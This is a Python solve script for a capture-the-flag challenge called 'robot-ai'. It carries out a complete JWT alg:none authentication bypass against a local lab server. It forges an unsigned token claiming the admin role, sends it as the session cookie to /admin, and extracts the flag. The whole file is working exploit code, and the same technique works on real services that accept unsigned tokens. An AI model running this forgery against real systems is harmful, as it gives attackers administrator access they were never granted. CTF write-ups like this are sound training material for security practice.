#!/usr/bin/env python3
"""Solve robot-ai: JWT alg:none auth bypass.

Usage:
    python3 solve.py http://localhost:5006

Steps:
  1. GET /diagnostics to receive a guest JWT in the `marvin_session` cookie.
  2. Forge a token with header {"alg":"none"} and payload {"role":"admin"},
     leaving the signature empty. The server accepts alg:none, so no secret is
     needed.
  3. GET /admin with the forged cookie and print the flag.
"""
import base64
import json
import re
import sys
import urllib.request


def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge(role: str = "admin") -> str:
    header = {"alg": "none", "typ": "JWT"}
    payload = {"role": role, "user": "visitor"}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."  # empty signature


def get(url: str, cookie: str | None = None):
    req = urllib.request.Request(url)
    if cookie:
        req.add_header("Cookie", f"marvin_session={cookie}")
    with urllib.request.urlopen(req) as r:
        return r.status, r.read().decode(), r.headers


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5006"

    # 1. breadcrumb + guest badge (we don't even need the guest token, but this
    #    is how you discover the JWT).
    _, _, headers = get(f"{base}/diagnostics")
    print("guest Set-Cookie:", headers.get("Set-Cookie"))

    # 2 + 3. forge and use it.
    token = forge("admin")
    print("forged token:", token)
    status, body, _ = get(f"{base}/admin", cookie=token)
    m = re.search(r"flag\{[A-Za-z0-9_]+\}", body)
    print("status:", status)
    print("flag:", m.group(0) if m else "(not found)")


if __name__ == "__main__":
    main()
